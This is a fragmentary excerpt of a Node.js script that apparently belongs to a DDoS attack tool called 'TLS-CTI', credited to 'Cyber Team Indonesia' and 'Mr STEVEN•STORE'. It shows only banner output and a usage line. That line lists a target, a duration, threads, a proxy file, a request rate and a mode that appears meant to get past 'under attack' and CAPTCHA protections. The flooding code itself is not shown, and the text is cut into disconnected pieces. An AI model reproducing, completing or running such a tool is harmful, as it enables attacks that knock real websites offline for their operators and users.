...
`)
 console.log(`Method DDoS By Cyber Team Indonesia\n Cyber Team Indonesia\n Usage: node tls-cti.js target time thread proxy.txt rate uam/captha`); process.exit();}
 const headers = {};
...
console.log(`Methods: TLS-CTI`)
console.log(`Methods DDoS By Mr STEVEN•STORE🕊🪽`)
console.log(`Methods DDoS By Cyber Team Indonesia`)
console.log(`--------------------------------------------`)
